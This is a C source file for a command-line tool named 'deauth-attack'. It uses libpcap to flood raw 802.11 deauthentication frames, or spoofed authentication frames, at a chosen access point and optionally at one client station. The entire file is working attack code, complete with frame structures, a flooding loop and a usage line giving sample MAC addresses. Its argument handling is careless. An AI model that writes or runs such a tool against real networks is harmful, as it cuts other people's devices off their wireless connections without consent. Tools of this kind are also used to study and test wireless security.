#include <stdio.h>
#include <pcap.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <wchar.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#pragma pack(1)

#define INIT_SIZE 8

typedef struct {
  uint8_t revision;
  uint8_t pad;
  uint16_t length;
  uint32_t present;
} radiotap;

typedef struct {
  uint16_t type;
  uint16_t duration;
  uint8_t dest[6];
  uint8_t src[6];
  uint8_t bssid[6];
  uint16_t seq_frag;
} frame;

typedef struct {
  uint16_t reason_code;
} fixed_deauth;

typedef struct {
  uint16_t auth_algorithm;
  uint16_t auth_seq;
  uint16_t status_code;
} fixed_auth;

typedef struct {
  radiotap radiotap;
  frame frame;
  fixed_deauth fixed_deauth;
} _80211_deauth;

typedef struct {
  radiotap radiotap;
  frame frame;
  fixed_auth fixed_auth;
} _80211_auth;

typedef struct {
  char *interface;
  uint8_t ap[6];
  uint8_t station[6];
  uint8_t argc;
} args;

char* str(int size) {
	char* string = (char*)malloc(sizeof(char) * size);

	for (int i = 0; i < size; i++)
		string[i] = '\0';

	return string;
}

char** split(char *sentence, char separator) {
	char** tokens;
	int* lengths;
	int tokens_idx = 0;
	int token_idx = 0;
	int num_tokens = 1;

	for (int i = 0; i < strlen(sentence); i++) {
		if (sentence[i] == separator)
			(num_tokens)++;
	}

	lengths = (int*)malloc(sizeof(int) * (num_tokens));
	tokens = (char**)malloc(sizeof(char*) * (num_tokens));

	for (int i = 0; i < num_tokens; i++) {
		tokens[i] = str(INIT_SIZE);
		lengths[i] = INIT_SIZE;
	}

	for (int i = 0; i < strlen(sentence); i++) {
		if (sentence[i] == separator && strlen(tokens[tokens_idx]) != 0) {
			token_idx = 0;
			tokens_idx++;
		}
		else if (sentence[i] == separator && strlen(tokens[tokens_idx]) == 0){
			continue;
		}
		else {
			/* Memory reallocation, If  array is full. */

			if (strlen(tokens[tokens_idx]) == lengths[tokens_idx] - 1) {
				tokens[tokens_idx] = realloc(tokens[tokens_idx], (lengths[tokens_idx] * sizeof(char)) << 1);

				for (int j = lengths[tokens_idx]; j < lengths[tokens_idx] << 1; j++)
					tokens[tokens_idx][j] = '\0';

				lengths[tokens_idx] <<= 1;
			}

			tokens[tokens_idx][token_idx] = sentence[i];
			token_idx++;
		}
	}

	return tokens;
}


void usage() {
	printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
	printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB -auth\n");
}

void sendDeauth(args* argv) {
  pcap_t* handle = pcap_open_live(argv->interface, BUFSIZ, 1, 1000, NULL);
  if (handle == NULL) {
      printf("failed to open %s\n", argv->interface);
      return;
  }

  _80211_deauth* beacon = (_80211_deauth*)malloc(sizeof(_80211_deauth));
  
  beacon->radiotap.revision = 0;
  beacon->radiotap.pad = 0;
  beacon->radiotap.length = 8;
  beacon->radiotap.present = 0;
  beacon->frame.type = 0x00c0;
  beacon->frame.duration = 0x0000;
  memcpy(beacon->frame.src, argv->ap, 6);
  for(int i = 0; i < 6; i++) beacon->frame.dest[i] = 0xff;
  memcpy(beacon->frame.bssid, argv->ap, 6);
  beacon->frame.seq_frag = 0x0000;
  beacon->fixed_deauth.reason_code = 0x0007;
  int size = sizeof(_80211_deauth);
  
  if(argv->argc == 3) {
    while(1) {
      pcap_sendpacket(handle, beacon, size);
    }
  } else if(argv->argc == 4) {
      memcpy(beacon->frame.dest, argv->station, 6);
    while(1) {
      pcap_sendpacket(handle, beacon, size);
      for(int i = 0; i < 6; i++) beacon->frame.dest[i] ^= beacon->frame.src[i] ^= beacon->frame.dest[i] ^= beacon->frame.src[i];
      pcap_sendpacket(handle, beacon, size);
      for(int i = 0; i < 6; i++) beacon->frame.dest[i] ^= beacon->frame.src[i] ^= beacon->frame.dest[i] ^= beacon->frame.src[i];
    }
  }
  pcap_close(handle);
}

void sendAuth(args* argv) {
  pcap_t* handle = pcap_open_live(argv->interface, BUFSIZ, 1, 1000, NULL);
  if (handle == NULL) {
      printf("failed to open %s\n", argv->interface);
      return;
  }

  _80211_auth* beacon = (_80211_auth*)malloc(sizeof(_80211_auth));
  
  beacon->radiotap.revision = 0;
  beacon->radiotap.pad = 0;
  beacon->radiotap.length = 8;
  beacon->radiotap.present = 0;
  beacon->frame.type = 0x00b0;
  beacon->frame.duration = 0x0000;
  memcpy(beacon->frame.dest, argv->ap, 6);
  memcpy(beacon->frame.src, argv->station, 6);
  memcpy(beacon->frame.bssid, argv->ap, 6);
  beacon->frame.seq_frag = 0x0000;
  beacon->fixed_auth.auth_algorithm = 0x0000;
  beacon->fixed_auth.auth_seq = 0x0002;
  beacon->fixed_auth.status_code = 0x0000;
  int size = sizeof(_80211_auth);
  
  while(1) {
    pcap_sendpacket(handle, beacon, size);
  }
  pcap_close(handle);
}

int main(int argc, char* argv[]) {
  if (argc < 2) {
		usage();
		return -1;
	}

  int auth = 0;
  args argvs;

  argvs.interface = argv[1];
  for(int i = 0; i < 6; i++) argvs.ap[i] = strtol(argv[2] + i * 3, NULL, 16);
  argvs.argc = argc;
  if (argc > 3) {
    for(int i = 0; i < 6; i++) argvs.station[i] = strtol(argv[3] + i * 3, NULL, 16);
    if (argc == 5 && !strcmp(argv[4], "-auth")) auth = 1;
  }

  pthread_t p_thread;
  if (auth) pthread_create(&p_thread, NULL, sendAuth, &argvs);
  else pthread_create(&p_thread, NULL, sendDeauth, &argvs);
  pthread_detach(p_thread);
  while(1) sleep(100);
  return 0;
}
